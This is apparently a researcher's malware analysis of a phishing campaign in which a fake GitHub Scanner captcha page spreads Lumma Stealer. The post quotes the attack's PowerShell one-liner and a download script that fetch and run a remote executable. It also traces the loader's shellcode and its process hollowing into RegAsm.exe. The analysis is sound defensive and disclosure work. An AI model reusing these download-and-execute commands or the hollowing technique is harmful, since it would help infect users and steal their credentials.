# Introduction
On September 19, 2024, I received an email regarding a GitHub Scanner result for my public repository. Initially, the email was not flagged as malicious or spam; however, further investigation revealed it to be part of a malware campaign attempting to distribute Lumma Stealer, disguised as a GitHub Scanner notification.

# Technical Analysis
Upon accessing the link (https://github-scanner.com), a Captcha verification page is presented.

The Captcha Verification steps are as follow:

![IMG3](/assets/images/github-scanner-lumma-stealer/img3.jpg)

The copied malicious PowerShell payload will execute the commands specified in `download.txt`.
```ps
powershell.exe -w hidden -Command "iex (iwr 'https://github-scanner.com/download.txt').Content" # "âœ… ''I am not a robot - reCAPTCHA Verification ID: 93752"
```

The `download.txt` contains the following content, which fetches an executable, renames it to `SysSetup.exe`, and executes it:
```ps
$webClient = New-Object System.Net.WebClient
$url1 = "https://github-scanner.com/l6E.exe"
$filePath1 = "$env:TEMP\SysSetup.exe"
$webClient.DownloadFile($url1, $filePath1)
Start-Process -FilePath  $env:TEMP\SysSetup.exe
```

The `l6E.exe` (also referred to as `SysSetup.exe`) is a .NET executable, and its main function is as follows:

![IMG4](/assets/images/github-scanner-lumma-stealer/img4.png)

The `PersonalActivation` method serves as a decryption function to decrypt `Program.AIOsncoiuuA`, using `Program.Alco` as the key, and `MoveAngles.userBuffer`, using `MoveAngles.key`:

Upon decrypting the blob, it calls `VirtualProtect` on it with **PAGE_EXECUTE_READWRITE** permissions, and then executes it using `CallWindowProcW`.

The `Program.AIOsncoiuuA` appears to be shellcode and `MoveAngles.userBuffer` is an executable once decrypted:

## Shellcode Analysis
The shellcode first iterates through **_PEB_LDR_DATA** to resolve the `LoadLibraryA` and `GetProcAddress` APIs:

![IMG7](/assets/images/github-scanner-lumma-stealer/img7.png)

It then uses the `GetProcAddress` to obtain the addresses of the following APIs: `CreateProcessA`, `VirtualAlloc`, `GetThreatContext`, `ReadProcessMemory`, `VirtualAllocEx`, `WriteProcessMemory`, `SetThreatContext` and `ResumeThread`.

![IMG8](/assets/images/github-scanner-lumma-stealer/img8.png)

Moving on, it spawns a child process of `RegAsm.exe` and allocates memory in its address space with **PAGE_EXECUTE_READWRITE** permissions. It then retrieves the current thread context of `RegAsm.exe`, allowing the it to later modify its execution flow by manipulating the thread's state and registers, this suggest that it setting up memory for Process Hollowing later.

![IMG9](/assets/images/github-scanner-lumma-stealer/img9.png)

After that, the `MoveAngles.userBuffer` EXE code sections are now written into the memory of `RegAsm.exe`. This step is key to the process hollowing technique, as the legitimate `RegAsm.exe` code is replaced with malicious code. Each section of memory (`.text`, .`rdata`, `.data`, `.reloc`) is replaced sequentially, suggesting a complete takeover of the executable's logic.

![IMG10](/assets/images/github-scanner-lumma-stealer/img10.png)

Finally, the loader restores the modified thread context (`SetThreadContext`) to point to the newly injected malicious code, and then resumes the thread using `ResumeThread`. At this point, `RegAsm.exe` will execute the malicious code instead of its original program.

The malicious EXE code injected into `RegAsm.exe` is as follows. At first glance, it appears to decrypt itself at runtime:

Execute it in [ANY RUN](https://any.run/) indicates that LUMMA Stealer has been detected:
